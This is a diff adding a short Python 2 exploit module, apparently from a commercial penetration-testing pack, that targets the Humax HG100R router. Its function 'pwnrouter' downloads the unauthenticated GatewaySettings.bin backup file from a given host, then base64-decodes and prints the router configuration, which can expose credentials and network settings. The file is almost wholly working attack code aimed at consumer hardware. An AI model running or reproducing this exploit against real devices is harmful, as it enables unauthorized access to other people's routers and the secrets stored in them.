@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import base64
+
+_name_   = 'd2sec_humax_1'
+_vendor_ = 'humax'
+_model_  = ['HG100R']
+_vuln_   = 'Humax HG100R backup file download vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  path = '/view/basic/GatewaySettings.bin'
+  url = 'http://%s/%s' % (host, path)
+  data = ''
+  print '[+] Host: %s' % host
+  print '[+] Downloading configuration file and decoding...'
+  try:
+    r = requests.get(url, stream=True,timeout=10)
+    for chunk in r.iter_content(chunk_size=1024):
+      if chunk:
+        rawdata = r.content
+    data = base64.b64decode(rawdata).decode('ascii','ignore').replace('^@','')
+  except:
+    pass
+  if not data:
+    print '[-] Not vulnerable' 
+  else:
+    print '[+] Configuration file :'
+    print data 
+
+    
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
